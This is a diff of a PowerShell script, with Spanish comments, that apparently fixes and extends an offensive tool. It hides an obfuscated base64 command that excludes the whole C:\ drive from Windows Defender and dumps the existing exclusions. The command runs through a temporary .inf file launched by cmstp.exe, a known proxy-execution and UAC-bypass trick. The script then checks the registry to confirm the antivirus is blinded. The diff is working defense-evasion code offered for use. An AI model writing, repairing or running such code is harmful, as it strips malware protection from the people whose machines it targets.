@@ -37,14 +37,22 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 '@
 
+    $B64Command = "LgAoACIAQQBkAGQALQBNACIAIAArACAAIgBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIgApACAA" +
+                  "LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAOwAgACgARwBlAHQALQBDAGkA" +
+                  "bQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAG0A" +
+                  "aQBjAHIAbwBzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQBmAGUAbgBkAGUAcgAgACAA" +
+                  "LQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMA" +
+                  "ZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUA" +
+                  "bgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA="
+
     # --- PARTE CRÍTICA REPARADA ---
     if ($Add) {
         try {
-            # 1. Crear archivo .inf temporal (técnica original)
+            # 1. Crear archivo .inf temporal
             $tempFile = "$env:TEMP\cmstp_$((Get-Date).Ticks).inf"
             $InfData.Replace("REPLACE", ".('iex') `"$B64Command`"") | Out-File $tempFile -Force
 
-            # 2. Ejecutar cmstp.exe SIN ERRORES
+            # 2. Ejecutar cmstp.exe correctamente
             $psi = New-Object System.Diagnostics.ProcessStartInfo
             $psi.FileName = "cmstp.exe"
             $psi.Arguments = "/au `"$tempFile`""
@@ -53,35 +61,48 @@ ShortSvcName="CorpVPN"
             $process = [System.Diagnostics.Process]::Start($psi)
             $process.WaitForExit(5000)
 
-            # 3. VERIFICACIÓN CORREGIDA (sin errores de conversión)
+            # 3. VERIFICACIÓN OPTIMIZADA (SIN ERRORES)
             $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-            $exclusions = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+            $exclusionFound = $false
             
-            if ($exclusions -ne $null) {
-                $exclusionActive = $false
-                $exclusions.PSObject.Properties | ForEach-Object {
-                    if ($_.Value -eq "C:\" -or $_.Value -eq 0) {
-                        $exclusionActive = $true
+            # Método principal de verificación
+            try {
+                $regValues = Get-ItemProperty -Path $regPath -ErrorAction Stop
+                $regValues.PSObject.Properties | ForEach-Object {
+                    if ($_.Name -eq "C_" -and $_.Value -eq 0) {
+                        $exclusionFound = $true
+                    }
+                    elseif ($_.Name -eq "C:\" -and $_.Value -eq 0) {
+                        $exclusionFound = $true
                     }
                 }
+            } catch { }
 
-                if ($exclusionActive) {
-                    Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (C:\ está excluida)" -ForegroundColor Green
-                } else {
-                    Write-Host "[!] Ejecutado, pero no se detectó la exclusión" -ForegroundColor Yellow
-                }
+            # Método alternativo si falla el principal
+            if (-not $exclusionFound) {
+                $manualCheck = Get-ChildItem $regPath -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.GetValue("") -eq 0 -or $_.GetValue("") -eq "C:\" }
+                $exclusionFound = [bool]$manualCheck
+            }
+
+            # Mostrar resultados
+            if ($exclusionFound) {
+                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (C:\ está excluida)" -ForegroundColor Green
             } else {
-                Write-Host "[✘] No se encontró la clave de exclusiones" -ForegroundColor Red
+                Write-Host "[!] Ejecutado pero no verificado automáticamente" -ForegroundColor Yellow
+                Write-Host "    Verifica manualmente con:" -ForegroundColor Gray
+                Write-Host "    Get-ChildItem '$regPath' | Select-Object -Property Name,Value" -ForegroundColor Cyan
             }
 
             # Limpieza
             Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-        } catch {
-            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
+        }
+        catch {
+            Write-Host "[✘] Error en el proceso: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
 
-    # ... (Resto de tu código original)
+    # ... (Resto de tus funciones originales: Exclusions, GetAV, User, Admin, Run, etc.)
 }
 
 # --- Ejecutar si se llama directamente ---
